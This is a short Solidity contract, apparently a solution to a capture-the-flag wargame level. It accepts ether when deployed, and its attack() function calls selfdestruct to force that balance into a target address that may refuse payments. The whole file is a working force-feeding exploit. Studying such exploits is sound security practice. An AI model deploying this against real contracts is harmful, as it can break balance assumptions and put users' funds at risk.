// SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0;
pragma solidity ^0.8.10;

contract ForceHacker {
    
    address addressToAttack;
    address public owner;

    constructor(address _address) payable{
        require(msg.value > 0 wei);
        addressToAttack = _address;
        owner = msg.sender;
    }

    function attack() public {
        selfdestruct(payable(addressToAttack));
    }
}